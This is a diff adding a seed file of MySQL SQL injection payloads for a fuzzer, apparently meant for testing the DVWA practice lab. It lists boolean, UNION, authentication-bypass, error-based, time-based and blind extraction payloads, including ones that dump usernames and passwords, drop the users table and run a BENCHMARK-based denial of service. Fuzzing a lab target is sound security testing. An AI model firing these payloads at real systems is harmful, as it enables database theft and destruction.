@@ -1,0 +1,78 @@
+# MySQL-only SQL injection seeds for DVWA lab testing
+# - No pre-applied evasion (no %0A, %09, /**/, double encoding, mixed case, etc.)
+# - Pure/canonical payload form only. The fuzzer's MutationEngine is responsible
+#   for generating evasion variants from these seeds.
+# - One technique family per line, ordered by category for readability.
+
+# --- Baseline / boundary ---
+1
+0
+-1
+99999999
+abc
+
+# --- Boolean-based ---
+1 OR 1=1
+1 AND 1=1
+1 AND 1=0
+1' OR '1'='1
+1' AND '1'='1
+' OR 1=1
+' OR '1'='1
+admin' OR '1'='1
+x' OR 1=1 OR 'x'='y
+
+# --- UNION-based ---
+1 UNION SELECT 1,2
+1 UNION SELECT 1,2,3
+1 UNION SELECT user(),2
+1 UNION SELECT user(),database()
+1 UNION SELECT username,password FROM users
+1 UNION SELECT table_name,2 FROM information_schema.tables
+1 UNION SELECT column_name,2 FROM information_schema.columns
+1' UNION SELECT 1,2--
+1' UNION SELECT username,password FROM users--
+-1' UNION SELECT 1,2,3--
+1 union select null,null
+
+# --- Comment-terminated / classic auth bypass ---
+admin'--
+admin' #
+admin'/*
+' OR 1=1--
+' OR 1=1#
+1' OR '1'='1'--
+1' OR '1'='1'#
+
+# --- Stacked / query separation ---
+1; DROP TABLE users--
+1'; DROP TABLE users--
+
+# --- Time-based blind (MySQL) ---
+1 AND SLEEP(5)
+1' AND SLEEP(5)--
+1 OR SLEEP(5)
+1) OR SLEEP(5)#
+1 AND IF(1=1,SLEEP(5),0)
+
+# --- Error-based (MySQL specific functions) ---
+1 AND extractvalue(1,concat(0x7e,version()))
+1 AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))
+1 AND updatexml(1,concat(0x7e,version()),1)
+1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
+
+# --- Subquery / blind extraction ---
+1 AND (SELECT SUBSTRING(version(),1,1))=5
+1 AND ascii(substring((SELECT user()),1,1))>100
+1 AND (SELECT COUNT(*) FROM information_schema.tables)>0
+
+# --- ORDER BY / GROUP BY probing ---
+1 ORDER BY 1
+1 ORDER BY 10
+1 GROUP BY 1,2,3
+
+# --- Function call / benchmark (DoS-style blind) ---
+1 OR BENCHMARK(5000000,MD5(1))
+
+# --- NULL byte / encoding edge case (kept singular, not combined with boundary matrix) ---
+1%00
